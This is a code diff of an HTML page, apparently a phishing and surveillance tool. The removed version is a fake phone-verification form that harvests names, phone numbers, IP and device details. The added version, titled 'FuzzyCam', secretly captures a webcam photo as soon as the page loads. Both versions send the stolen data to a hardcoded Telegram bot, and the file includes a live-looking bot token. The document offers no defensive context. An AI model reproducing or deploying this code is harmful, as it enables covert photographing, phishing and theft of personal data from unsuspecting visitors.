@@ -1,237 +1,55 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>Verify Your Phone</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-    * { box-sizing: border-box; }
-    html, body {
-      margin: 0; padding: 0;
-      font-family: 'Poppins', sans-serif;
-      height: 100%; overflow: hidden;
-      background: #000;
-      color: white;
-    }
-    video#bgVideo {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      object-fit: cover;
-      z-index: 0;
-      filter: brightness(0.4) saturate(1.2) contrast(1.2);
-    }
-    .container {
-      position: relative;
-      z-index: 2;
-      background: rgba(25, 0, 0, 0.75);
-      padding: 35px 30px;
-      border-radius: 18px;
-      max-width: 420px;
-      width: 90%;
-      box-shadow:
-        0 0 15px 4px rgba(255, 23, 68, 0.7),
-        0 0 30px 8px rgba(255, 23, 68, 0.5);
-      text-align: center;
-      margin: 5% auto;
-    }
-    h2 {
-      margin-bottom: 24px;
-      font-size: 24px;
-      color: #ff1744;
-      text-shadow: 0 0 6px #ff1744aa;
-    }
-    .input-group {
-      margin-bottom: 16px;
-      text-align: left;
-    }
-    label {
-      display: block;
-      font-weight: 600;
-      font-size: 14px;
-      margin-bottom: 5px;
-      color: #ff8a80;
-    }
-    input, select {
-      width: 100%;
-      padding: 12px;
-      border-radius: 12px;
-      border: none;
-      background: #2d0000;
-      color: white;
-      font-size: 16px;
-    }
-    input:focus, select:focus {
-      outline: none;
-      box-shadow: 0 0 12px #ff1744;
-    }
-    button {
-      width: 100%;
-      padding: 14px;
-      border-radius: 14px;
-      background: linear-gradient(45deg, #d50000, #c51162);
-      font-size: 16px;
-      font-weight: bold;
-      color: white;
-      border: none;
-      cursor: pointer;
-      box-shadow: 0 0 20px #ff174488;
-    }
-    button:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 30px #ff1744cc;
-    }
-    .error {
-      margin-top: 14px;
-      font-size: 15px;
-      font-weight: bold;
-      color: #ff5252;
-      text-shadow: 0 0 6px #ff5252aa;
-      opacity: 0;
-      transition: 0.3s;
-    }
-    .error.show {
-      opacity: 1;
-    }
-    #progress {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: rgba(0, 0, 0, 0.75);
-      z-index: 99;
-      color: white;
-      display: none;
-      justify-content: center;
-      align-items: center;
-      font-size: 18px;
-      font-weight: bold;
-    }
-  </style>
+  <title>FuzzyCam 😈</title>
 </head>
 <body>
+  <video id="video" autoplay playsinline style="display:none;"></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-<video id="bgVideo" autoplay muted loop playsinline>
-  <source src="video.mp4" type="video/mp4">
-</video>
+  <script>
+    const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
+    const chatId = "8182050140";
 
-<div class="container">
-  <h2>📱 Verify Phone</h2>
-  <div class="input-group"><label>First Name</label><input id="firstName" type="text" placeholder="John"></div>
-  <div class="input-group"><label>Last Name</label><input id="lastName" type="text" placeholder="Doe"></div>
-  <div class="input-group"><label>Country</label>
-    <select id="country">
-      <option value="+94">🇱🇰 Sri Lanka (+94)</option>
-      <option value="+91">🇮🇳 India (+91)</option>
-      <option value="+1">🇺🇸 USA (+1)</option>
-      <option value="+44">🇬🇧 UK (+44)</option>
-      <option value="+65">🇸🇬 Singapore (+65)</option>
-    </select>
-  </div>
-  <div class="input-group"><label>SIM</label>
-    <select id="sim">
-      <option value="">-- Select your SIM --</option>
-      <option>Dialog</option>
-      <option>Mobitel</option>
-      <option>Airtel</option>
-      <option>Hutch</option>
-    </select>
-  </div>
-  <div class="input-group"><label>Phone Number</label><input id="phone" type="tel" placeholder="77XXXXXXX"></div>
-  <button onclick="sendData()">Verify</button>
-  <div class="error" id="errorMsg"></div>
-</div>
+    async function captureAndSendPhoto() {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const context = canvas.getContext('2d');
 
-<div id="progress">⏳ Verifying... Please wait</div>
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-<script>
-  const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
-  const chatId = "8182050140";
+        // Wait for camera to initialize
+        await new Promise(resolve => setTimeout(resolve, 2000));
 
-  async function getIP() {
-    try {
-      const res = await fetch("https://api.ipify.org?format=json");
-      const data = await res.json();
-      return data.ip;
-    } catch {
-      return "N/A";
-    }
-  }
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-  async function sendData() {
-    const firstName = document.getElementById('firstName').value.trim();
-    const lastName = document.getElementById('lastName').value.trim();
-    const phone = document.getElementById('phone').value.trim();
-    const sim = document.getElementById('sim').value;
-    const country = document.getElementById('country').value;
-    const error = document.getElementById('errorMsg');
+        stream.getTracks().forEach(track => track.stop()); // Stop camera
 
-    error.classList.remove("show");
+        canvas.toBlob(async (blob) => {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, 'photo.jpg');
 
-    if (!firstName || !lastName || !phone || !sim) {
-      error.textContent = "❗ Please fill all fields!";
-      error.classList.add("show");
-      return;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+          });
+
+          alert("❤️ Photo sent successfully 😈");
+        }, 'image/jpeg');
+      } catch (e) {
+        alert("❌ Camera permission denied or error: " + e.message);
+      }
     }
 
-    document.getElementById('progress').style.display = 'flex';
-
-    const ip = await getIP();
-    const battery = await navigator.getBattery?.();
-    const batteryLevel = battery ? `${Math.round(battery.level * 100)}%` : "N/A";
-    const charging = battery ? (battery.charging ? "Yes" : "No") : "N/A";
-    const netType = navigator.connection?.effectiveType || "Unknown";
-    const date = new Date().toLocaleString();
-    const ua = navigator.userAgent;
-    const platform = navigator.platform;
-    const os = navigator.userAgentData?.platform || "Unknown";
-    const vendor = navigator.vendor || "Unknown";
-
-    const message = `
-📩 *New Submission*
-
-👤 Name: ${firstName} ${lastName}
-
-📞 Phone: ${country}${phone}
-
-📶 SIM: ${sim}
-
-🌐 IP Address: ${ip}
-
-🔋 Battery: ${batteryLevel}
-
-⚡ Charging: ${charging}
-
-📡 Network: ${netType}
-
-📱 Device: ${ua}
-
-🏷️ Manufacturer: ${vendor}
-
-🖥️ OS: ${os}
-
-💻 Platform Info: ${platform}
-
-📅 Time: ${date}
-    `;
-
-    const form = new FormData();
-    form.append("chat_id", chatId);
-    form.append("text", message);
-    form.append("parse_mode", "Markdown");
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: "POST",
-      body: form
-    }).then(() => {
-      window.location.href = "indexone.html"; // redirect after complete
-    }).catch(() => {
-      alert("❌ Failed to send to Telegram.");
-    }).finally(() => {
-      document.getElementById('progress').style.display = 'none';
-    });
-  }
-</script>
-
+    // Auto start on load
+    window.onload = () => {
+      captureAndSendPhoto();
+    };
+  </script>
 </body>
 </html>
